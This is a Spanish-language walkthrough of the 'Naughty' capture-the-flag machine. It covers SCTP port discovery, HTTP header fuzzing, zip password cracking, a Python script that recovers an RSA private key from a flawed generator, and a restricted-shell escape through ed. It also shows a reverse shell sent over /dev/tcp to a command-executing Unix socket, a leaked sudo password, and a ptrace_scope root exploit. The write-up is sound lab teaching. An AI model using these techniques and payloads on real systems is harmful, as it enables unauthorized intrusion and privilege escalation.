---
layout: post
title: Naughty
date: 2023-04-19
description:
cover_id:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/naughty-machine/naughty-machine.png" alt=""></center>

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 192.168.16.135 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:45 GMT
Nmap done: 1 IP address (1 host up) scanned in 4.12 seconds
```

La máquina no tiene ningún puerto abierto por TCP. Paso a UDP

```null
nmap -p- --open --min-rate 5000 -n -Pn -sU 192.168.16.135 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:46 GMT
Warning: 192.168.16.135 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.16.135
Host is up (0.0012s latency).
All 65535 scanned ports on 192.168.16.135 are in ignored states.
Not shown: 65385 open|filtered udp ports (no-response), 150 closed udp ports (port-unreach)
MAC Address: 00:0C:29:70:DF:4A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 144.84 seconds
```

Nada por UDP. Otro protocolo común es SCTP

```null
nmap -p- --open --min-rate 5000 -n -Pn -sY 192.168.16.135 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:50 GMT
Nmap scan report for 192.168.16.135
Host is up (0.00029s latency).
Not shown: 65533 closed sctp ports (abort)
PORT    STATE SERVICE
22/sctp open  ssh
80/sctp open  http
MAC Address: 00:0C:29:70:DF:4A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.44 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 -sY 192.168.16.135 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:54 GMT
Nmap scan report for 192.168.16.135
Host is up (0.00043s latency).

PORT    STATE SERVICE    VERSION
22/sctp open  tcpwrapped
80/sctp open  tcpwrapped
MAC Address: 00:0C:29:70:DF:4A (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

No puedo escanearlos directamente, así que con ```socat``` redirijo el tráfico de SCTP a TCP

```null
socat TCP-LISTEN:80,fork sctp:192.168.16.135:80 &>/dev/null & disown
socat TCP-LISTEN:22,fork sctp:192.168.16.135:22 &>/dev/null & disown
```

Y hago de nuevo el escaneo pero por TCP a mi localhost

```null
nmap -sCV -p22,80 localhost -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:57 GMT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7bf3bcae0fc5f228bfaae71a8ca268c8 (RSA)
|   256 84bc45e260008053e31b531eeaf84fae (ECDSA)
|_  256 c12e43f3f1c539fa02db6d8b4b1ca927 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://localhost
http://localhost [403 Forbidden] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[127.0.0.1], Title[403 Forbidden]
```

No tengo acceso a la página principal

```null
curl -s -X GET localhost | html2text
****** Forbidden ******
You don't have permission to access this resource.
```

Se está aplicando VirtualHosting

```null
echo '127.0.0.1 naughty.htb' >> /etc/hosts
```

Puedo ver un calendario

<img src="/writeups/assets/img/naughty-machine/1.png" alt="">

Encuentro varias páginas HTML

```null
wfuzz -c -L --hh=1738 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt http://naughty.htb/FUZZ.html
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://naughty.htb/FUZZ.html
Total requests: 26584

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000003:   200        54 L     151 W      1681 Ch     "admin"                                                                                                                                         
000000238:   200        244 L    659 W      6153 Ch     "index"                                                                                                                                         
000000022:   200        54 L     151 W      1681 Ch     "user"                                                                                                                                          
000002655:   200        54 L     151 W      1681 Ch     "403"                                                                                                                                           
000003809:   200        54 L     151 W      1681 Ch     "http://naughty.htb/403.html"                                                                                                                   
000000126:   200        54 L     151 W      1681 Ch     "mail"                                                                                                                                          

Total time: 33.19579
Processed Requests: 26388
Filtered Requests: 26382
Requests/sec.: 794.9199
```

El ```admin.html``` me aplica un redirect a ```403.html```

```null
curl -s -X GET http://naughty.htb/admin.html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://naughty.htb/403.html">here</a>.</p>
</body></html>
```

En las cabeceras de la respuesta se puede ver un ```NaughtyUser: 1```

```null
curl -s -X GET http://naughty.htb/admin.html -L -I
HTTP/1.1 302 Found
Date: Wed, 19 Apr 2023 14:34:04 GMT
Server: Apache
X-Frame-Options: DENY
Location: http://naughty.htb/403.html
Content-Length: 211
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Wed, 19 Apr 2023 14:34:04 GMT
Server: Apache
X-Frame-Options: DENY
Last-Modified: Wed, 09 Feb 2022 22:42:05 GMT
ETag: "691-5d79d8b00ca3a"
Accept-Ranges: bytes
Content-Length: 1681
Vary: Accept-Encoding
Access-Control-Allow-Origin: http://naughty.htb
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Content-Security-Policy: allow 'self';
NaughtyUser: 1
Content-Type: text/html; charset=utf-8
```

Fuzzeo por el resto de cabeceras

```null
cat /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt | awk '{print "Naughty" $1}' > dictionary
```

```null
wfuzz -c --hh=1681 -L -w /home/rubbx/Desktop/Naughty/dictionary -H "FUZZ: 1" http://naughty.htb/admin.html
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://naughty.htb/admin.html
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000494:   200        596 L    1285 W     23065 Ch    "Naughtyadmid"                                                                                                                                 

Total time: 0
Processed Requests: 6453
Filtered Requests: 6452
Requests/sec.: 0
```

Añado la cabecera desde el ```BurpSuite```, pero con ```NaughtyAdmid: 1```, en vez de todo minúscula, ya que en caso contrario no carga nada

<img src="/writeups/assets/img/naughty-machine/2.png" alt="">

Tengo acceso a otro panel

<img src="/writeups/assets/img/naughty-machine/3.png" alt="">

En ```mail.html``` puedo ver varios correos

<img src="/writeups/assets/img/naughty-machine/4.png" alt="">

Uno de ellos contiene una clave pública

<img src="/writeups/assets/img/naughty-machine/5.png" alt="">

Su contenido es el siguiente:

```null
cat wh1tedrvg0n.pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAk20cqEqzhdLnNOpaPL9w
srQ2qAQV833B0GTtWJ8dqVMAsP4hrOShp14Mgwq7Mz6Z+BOxZhppWmWZ4ZJLAo8E
JsLr7iWvSLK+hjaz23ENNZoG436TvCmBNN880JH7eIYQb/0DYgRNSqa473I88+4e
D6PATfgYByLG7SsQvLv2FsEXYF0SW+WR9Nm3SsVpY0SPMgUfsld1K7h4xGck/lhg
2/tA8nFtsH0OBb5EOC1+HeSMxHJI8xciQQndBwoKieWYqKD0r8ClL6MiVA1tCq3w
cR9CsxXJNFWhntRr9eS4hi3mLXAEHXABaGwM+ptzWhegl+m5+gYFFTldVBrpsPvY
0wIDAQAB
-----END PUBLIC KEY-----
```

Al ser de pequeño tamaño, se puede tratar de factorizar. En otro correo se comparte un comprimido

<img src="/writeups/assets/img/naughty-machine/6.png" alt="">

Está cifrado, con john lo crackeo y extraigo la contraseña

```null
zip2john data.zip > hash
```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
infected         (data.zip)     
1g 0:00:00:00 DONE (2023-04-19 15:14) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s 271087..dyesebel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Puedo ver un mensaje encriptado

```null
ls -la
total 20
drwxr-xr-x 2 root root 4096 Apr 19 15:15 .
drwxr-xr-x 3 root root 4096 Apr 19 15:14 ..
-rw-r--r-- 1 root root  361 Mar 13  2022 .generator.backup
-rw-r--r-- 1 root root  140 Mar 12  2022 instructions.txt
-rw-r--r-- 1 root root  256 Mar 12  2022 message.encrypted
```

Extraigo el valor de ```e``` y ```n``` con python

```null
 python3
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.PublicKey import RSA
>>> f = open("wh1tedrvg0n.pem", "r")
>>> key = RSA.importKey(f.read())
>>> key.e
65537
>>> key.n
18610835934412662362317829511171393239463749657652440980677110600927942905492015629622700026665957838241253327519347326977540433428316610234247938390935644044608243364718988540537680745480916135674723444328795584928427524528223898037742412097129114329230604994314590628910703907791635874720768591963337877180471956137309668299274445987133754293478714093340787943515488369755258670872737550689031108900947141043570077086541547667748073742737872417268119791981999027408499470552887188195292361948471238948750531475439102428213462152602428152792791383876168673695192432188723088093087294315404215703752526839202166069459
```

Para factorizar ```n```, utilizo la web de [factordb.com](http://factordb.com). Pero en este caso son demasiado grandes y no los obtiene

<img src="/writeups/assets/img/naughty-machine/7.png" alt="">

En el ZIP se encontraba un backup del script que se utilizó para generar la clave pública

```null
require 'openssl'

e = 65537
while true
  p = OpenSSL::BN.generate_prime(1024, false)
  q = OpenSSL::BN.new(e).mod_inverse(p)
  next unless q.prime?
  key = OpenSSL::PKey::RSA.new
  key.set_key(p.to_i * q.to_i, e, nil)
  File.write('wh1tedrvg0n.pem', key.to_pem)
  File.binwrite('message.encrypted', key.public_encrypt(File.binread('message.txt')))
  break
end
```

En este caso, ```q``` no es un número primo aleatorio ya que depende de ```e```, que ya lo conozco y el valor de ```p``` que se genere. Se puede crear un script en python que se encargue de utilizar una operatiria para obtener el valor de los dos números primos

```null
from pwn import *
from Crypto.PublicKey import RSA
from Crypto.Util.number import *
import gmpy2, signal, sys

def def_handler(sig, frame):
    sys.exit(1)

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(e, m):
    g, x, y = egcd(e, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

f = open("../wh1tedrvg0n.pem", "r")

key = RSA.importKey(f.read())

e = key.e
n = key.n

log.info("e: %s" % e)
log.info("n: %s" % n)

for k in range(1, 10000000):

    if gmpy2.iroot(1+4*e*k*n, 2)[1] == True:
        q = (1+int(gmpy2.iroot(1+4*e*k*n, 2)[0]))//(2*e)

        if n % q == 0:
            break
    
log.info("q: %s" % q)

p = n//q
log.info("p: %s" % p)

m = n-(p+q-1)

d = modinv(e, m)

key = RSA.construct((n, e, d, p, q))

print("\n", key.exportKey().decode(), "\n")
```

Al ejecutarlo obtengo la clave privada

```null
python3 decryptor.py
[*] e: 65537
[*] n: 18610835934412662362317829511171393239463749657652440980677110600927942905492015629622700026665957838241253327519347326977540433428316610234247938390935644044608243364718988540537680745480916135674723444328795584928427524528223898037742412097129114329230604994314590628910703907791635874720768591963337877180471956137309668299274445987133754293478714093340787943515488369755258670872737550689031108900947141043570077086541547667748073742737872417268119791981999027408499470552887188195292361948471238948750531475439102428213462152602428152792791383876168673695192432188723088093087294315404215703752526839202166069459
[*] q: 112388545537851929959503745388044157714715281068105121616685741013740101652219306881134558938968191871675417297212972070870560474940550877848266643042039229585192762446203727272394599534285231008777875550808343662174912292856043596178754631662380773407054727996244205781038433809796109146059730302662535324993
[*] p: 165593707484581878007104248235077562143644230561160192342462531673054969469008469313599720979837194035386506821210578925554045005534597187085023628260929069004603823570972429726864318113274532028378498875299604734441484418545560457796021634335823937652386369350041738180573647405409343639957656134118583129363

 -----BEGIN RSA PRIVATE KEY-----
MIIEJgIBAAKCAQEAk20cqEqzhdLnNOpaPL9wsrQ2qAQV833B0GTtWJ8dqVMAsP4h
rOShp14Mgwq7Mz6Z+BOxZhppWmWZ4ZJLAo8EJsLr7iWvSLK+hjaz23ENNZoG436T
vCmBNN880JH7eIYQb/0DYgRNSqa473I88+4eD6PATfgYByLG7SsQvLv2FsEXYF0S
W+WR9Nm3SsVpY0SPMgUfsld1K7h4xGck/lhg2/tA8nFtsH0OBb5EOC1+HeSMxHJI
8xciQQndBwoKieWYqKD0r8ClL6MiVA1tCq3wcR9CsxXJNFWhntRr9eS4hi3mLXAE
HXABaGwM+ptzWhegl+m5+gYFFTldVBrpsPvY0wIDAQABAoIBAEPGiMMxvICMafCg
wKVm2Xe+c9YgMrtDGEQm8hqo4+kBGLNF0dN7NHoOObBQ0akIYZ5z5z1qbP668NiL
+eIOP7lWKULNnlzMl9x574u12H3I9tvFSEPbzOOysXGtey94arwhVFnOYn4sUZ77
JNx7nuRPwsvVf65gJZXJE6PAwazJmGlNxw61DyrrRSgNhCs9JD6qyyxT+TiVghH7
/l9OWDDKsdsIKULz+pTNezhh71bqE2vSt9dRlHrcMNrR9VvcTHxL0jUL2mwRZfJR
VYD/pZ7yEu3HxmH+BO4RGWIE5tE5VGGyPGYtdL/0wQjjr6gSzXniFNnC2ZmSkcoI
mNzaVoECgYEA69AyQ8y25KlEyzU2MIInlPQgZW8y2Ukjcw3QWMvSiEW9mYYr8sSD
irxOvyg195b+s4y/UDDIo6u0CicRn5K0AjcovAKvDSd8SAWsqFa01I8cJw93Qty3
6zVnPUj9ZZUlbsKev76YBmikF1alpCFL48/p43VgjVuSy2J7XzhdVRMCgYEAoAvu
EZYfi5JW3pR+8u1jb/VBB5cxK8g4Bx6ZCatMeLDcvhYSPfKiVMb5q0PfXOtecv5T
2llB09P1ne5mR6eKBPbq7q/jn0ntT/SJ+rbehGWc9eXJS9gB++GC8FVZplhTz5jH
pdv10mOy+yQTyBHRMA0s8PP5U/eS6fctRLM8pUECgYEAhJeyS7El/Xi399LZv3jP
rM+AD8jwvICFcEIKLoOcw4cDTvnEaGLa2/16Ab4oaij62hZ/1CU6C92WBEdnf2RL
1xsQynZv22OiXBTkulrWntZBLC1kD7Jvr899V1ZdNOsh+x9vh70xWhkoev77cEhQ
la3ogz8SpSkiZz3exPG6eQUCgYEAmLwp2xCoVBs42btfF1gisEKeZ68K1tyBU5II
vGiEVx1529HWYNX/wuYMeDwSmmtoPFeoEFVj89JwsOJFK5agqbI2a8jhci8r0UTu
tJv16OXMEALVwpKG+iixO8hIAO6ENTZ5OTib9Mb+lJtOYX1XZAL+44gBZfd7ddpU
kh52/sECAwEAAQ==
-----END RSA PRIVATE KEY----- 
```

Desencripto el mensaje y obtengo credenciales de acceso por SSH

```null
openssl rsautl -decrypt -inkey id_rsa < message.encrypted
The command rsautl was deprecated in version 3.0. Use 'pkeyutl' instead.
user: wh1tedrvg0n
pass: LucK11Y0v!$
```

```null
ssh wh1tedrvg0n@naughty.htb
The authenticity of host 'naughty.htb (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:+blH6x4tR+TzY8IDxrG3mM5dVFHdgeiKGq7Hri4jr1M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'naughty.htb' (ED25519) to the list of known hosts.
wh1tedrvg0n@naughty.htb's password: 

== NaughtyServer ==
Welcome Wh1teDrvg0n!

wh1tedrvg0n:~$ 
```

Estoy en una ```Limited bash```

```null
wh1tedrvg0n:~$ echo $SHELL
*** forbidden path: /usr/bin/lshell
```

Puedo ejecutar varios comandos

```null
wh1tedrvg0n:~$ help
cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  vim
```

El binario ```cat``` no es el típico que contienen el resto de máquinas linux, si no que es un editor de texto antiguo

```null
wh1tedrvg0n:~$ cat --help
GNU ed is a line-oriented text editor. It is used to create, display,
modify and otherwise manipulate text files, both interactively and via
shell scripts. A restricted version of ed, red, can only edit files in
the current directory and cannot execute shell commands. Ed is the
'standard' text editor in the sense that it is the original editor for
Unix, and thus widely available. For most purposes, however, it is
superseded by full-screen editors such as GNU Emacs or GNU Moe.

Usage: ed [options] [file]

Options:
  -h, --help                 display this help and exit
  -V, --version              output version information and exit
  -E, --extended-regexp      use extended regular expressions
  -G, --traditional          run in compatibility mode
  -l, --loose-exit-status    exit with 0 status even if a command fails
  -p, --prompt=STRING        use STRING as an interactive prompt
  -r, --restricted           run in restricted mode
  -s, --quiet, --silent      suppress diagnostics, byte counts and '!' prompt
  -v, --verbose              be verbose; equivalent to the 'H' command

Start edit by reading in 'file' if given.
If 'file' begins with a '!', read output of shell command.

Exit status: 0 for a normal exit, 1 for environmental problems (file
not found, invalid flags, I/O errors, etc), 2 to indicate a corrupt or
invalid input file, 3 for an internal consistency error (eg, bug) which
caused ed to panic.

Report bugs to bug-ed@gnu.org
Ed home page: http://www.gnu.org/software/ed/ed.html
General help using GNU software: http://www.gnu.org/gethelp
```

Spawneo una bash

```null
wh1tedrvg0n:~$ cat
!/bin/bash
wh1tedrvg0n@naughty:~$ 
```

En el directorio personal del usuario ```s4vitar``` hay un directorio llamado ```work```

```null
wh1tedrvg0n@naughty:/home/s4vitar/work$ ls
notes.txt  server.py  socket_test.s
```

El script en python contiene lo siguiente:

```null
import socket
import os, os.path
import time
from collections import deque
import signal, sys

def def_handler(sig, frame):
	print("\n\n[!] Exiting...\n")
	os.remove("/home/s4vitar/work/socket_test.s")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def serverSocket():

	server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
	server.bind("/home/s4vitar/work/socket_test.s")
	os.system("chmod o+w /home/s4vitar/work/socket_test.s")

	while True:
		server.listen(1)
		conn, addr = server.accept()
		datagram = conn.recv(1024)

		if datagram:
			print(datagram)
			os.system(datagram)
			conn.close()

def deleteSocket():

	if os.path.exists("/home/s4vitar/work/socket_test.s"):
		os.remove("/home/s4vitar/work/socket_test.s")

if __name__ == '__main__':

	deleteSocket()
	serverSocket()
```

En caso de poder conectar y enviar datos al Unix Socket File ```socket_test.s```, podré llegar a ejecutar comandos como el usuario que ha desplegado el servicio. Sigo la guía de [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets) para la enumeración.

El socket está activo

```null
wh1tedrvg0n@naughty:/home/s4vitar/work$ netstat -a -p --unix | grep socket_test.s
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     182540   -                    /home/s4vitar/work/socket_test.s
```

Me envío una reverse shell

```null
wh1tedrvg0n@naughty:/tmp$ socat - UNIX-CLIENT:/home/s4vitar/work/socket_test.s
bash -c 'bash -i >& /dev/tcp/192.168.16.130/443 0>&1' & disown
```

Gano acceso como ```S4vitar```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.16.130] from (UNKNOWN) [192.168.16.135] 38908
s4vitar@naughty:~/work$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
s4vitar@naughty:~/work$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
s4vitar@naughty:~/work$ export TERM=xterm
s4vitar@naughty:~/work$ export SHELL=bash
s4vitar@naughty:~/work$ stty rows 55 columns 209
```

Puedo ver la primera flag

```null
s4vitar@naughty:~$ cat user.txt 
2a3d0cd5deba375d0916194f935b553b
```

# Escalada

Estoy en el grupo ```sudo```, pero no conozco su contraseña

```null
s4vitar@naughty:~$ id
uid=1001(s4vitar) gid=1001(s4vitar) groups=1001(s4vitar),27(sudo)
```

Subo el ```pspy``` para detectar tareas que se ejecutan en intervalos regulares de tiempo

```null
2023/04/19 17:56:01 CMD: UID=0    PID=33841  | /usr/sbin/CRON -f -P 
2023/04/19 17:56:01 CMD: UID=0    PID=33840  | /usr/sbin/CRON -f -P 
2023/04/19 17:56:01 CMD: UID=0    PID=33848  | tmux new-session -d -t sudo tests 
2023/04/19 17:56:01 CMD: UID=0    PID=33847  | tmux new-session -d -t sudo tests 
2023/04/19 17:56:01 CMD: UID=0    PID=33846  | /bin/bash /root/.job/s4vitar_sudo.sh 
2023/04/19 17:56:01 CMD: UID=0    PID=33845  | /bin/bash /root/.job/s4vitar_server.sh 
2023/04/19 17:56:01 CMD: UID=0    PID=33844  | /bin/bash /root/.job/s4vitar_server.sh 
2023/04/19 17:56:01 CMD: UID=0    PID=33843  | /bin/sh -c /root/.job/s4vitar_sudo.sh 
2023/04/19 17:56:01 CMD: UID=0    PID=33842  | /bin/sh -c /root/.job/s4vitar_server.sh 
2023/04/19 17:56:01 CMD: UID=0    PID=33849  | tmux new-session -d -t sudo tests 
```

Se está creando una nueva sesión de ```tmux```

```null
2023/04/19 17:56:02 CMD: UID=0    PID=33881  | sleep 1 
2023/04/19 17:56:02 CMD: UID=1001 PID=33880  | /bin/sh /usr/bin/lesspipe 
2023/04/19 17:56:02 CMD: UID=1001 PID=33879  | bash 
2023/04/19 17:56:02 CMD: UID=0    PID=33878  | su s4vitar 
2023/04/19 17:56:02 CMD: UID=1001 PID=33884  | dirname /usr/bin/lesspipe 
2023/04/19 17:56:02 CMD: UID=1001 PID=33883  | /bin/sh /usr/bin/lesspipe 
2023/04/19 17:56:02 CMD: UID=1001 PID=33885  | dircolors -b 
2023/04/19 17:56:02 CMD: UID=1001 PID=33887  | bash 
2023/04/19 17:56:02 CMD: UID=1001 PID=33886  | bash 
2023/04/19 17:56:02 CMD: UID=1001 PID=33888  | basename /usr/bin/lesspipe 
2023/04/19 17:56:02 CMD: UID=1001 PID=33890  | 
2023/04/19 17:56:02 CMD: UID=1001 PID=33889  | /bin/sh /usr/bin/lesspipe 
```

Además está migrando al usuario ```s4vitar```

```null
2023/04/19 17:56:02 CMD: UID=1001 PID=33889  | /bin/sh /usr/bin/lesspipe 
2023/04/19 17:56:02 CMD: UID=1001 PID=33891  | bash 
2023/04/19 17:56:03 CMD: UID=0    PID=33894  | sleep 1 
2023/04/19 17:56:03 CMD: UID=1001 PID=33893  | sudo whoami 
2023/04/19 17:56:03 CMD: UID=0    PID=33895  | tmux send-keys -t Server tests-1 cd /home/s4vitar/work/ C-m 
2023/04/19 17:56:03 CMD: UID=0    PID=33896  | sleep 1 
2023/04/19 17:56:04 CMD: UID=0    PID=33900  | sleep 50 
2023/04/19 17:56:04 CMD: UID=0    PID=33901  | sudo whoami
```

Luego se ejecuta el comando ```whoami``` como ```root```, pero al estar como ```S4vitar``` va a pedir la contraseña. Se lekea la contraseña

```null
2023/04/19 17:59:03 CMD: UID=1001 PID=34185  | sudo whoami 
2023/04/19 17:59:03 CMD: UID=0    PID=34188  | sleep 1 
2023/04/19 17:59:04 CMD: UID=0    PID=34189  | tmux send-keys -t sudo tests-1 my$up3rP@$$w00rd123$! C-m 
2023/04/19 17:59:04 CMD: UID=0    PID=34193  | sleep 50 
2023/04/19 17:59:04 CMD: UID=0    PID=34192  | sleep 1 
2023/04/19 17:59:04 CMD: UID=1001 PID=34191  | python3 server.py 
2023/04/19 17:59:04 CMD: UID=0    PID=34194  | whoami 
2023/04/19 17:59:04 CMD: UID=1001 PID=34195  | python3 server.py 
2023/04/19 17:59:05 CMD: UID=0    PID=34199  | sleep 50 
```

Me convierto en ```root```. Puedo ver la segunda flag

```null
s4vitar@naughty:/tmp$ sudo su
[sudo] password for s4vitar: 
root@naughty:/tmp# cat /root/root.txt 
f5da7a83a519369acee489b9c727aab3
```

Pero esta no es la vía intencionada de hacer la máquina. La idea es conectarse a la consola de root, la cual ya tiene almacenado un Token Privileage y me permite ejecutar comandos como este usuario. Se puede efectuar ya que el ```ptrace_scope``` vale 0

```null
s4vitar@naughty:/tmp$ cat /proc/sys/kernel/yama/ptrace_scope
0
```

El script que lo automatiza está en ```exploit-db```

```null
earchsploit ptrace scope
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CentOS 7.6 - 'ptrace_scope' Privilege Escalation                                                                                                                               | linux/local/46989.sh
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Lo ejecuto y gano una shell como root

```null
s4vitar@naughty:/tmp$ ./exploit.sh 
[*] Checking if 'ptrace_scope' is set to 0... [√]
[*] Checking if 'GDB' is installed...         [√]
[*] System seems vulnerable!                  [√]

[*] Starting attack...
[*] PID -> bash
[*] Path 33210: /home/s4vitar/work
[*] PID -> bash
[*] Path 33332: /home/s4vitar/work
[*] PID -> bash
[*] Path 33371: /home/s4vitar/work
[*] PID -> bash
[*] Path 33372: /home/s4vitar/work
[*] PID -> bash
[*] Path 33387: /tmp
[*] PID -> bash
[*] Path 34822: /tmp

[*] Cleaning up...                            [√]
[*] Spawning root shell...                    [√]

bash-5.1# whoami
root
```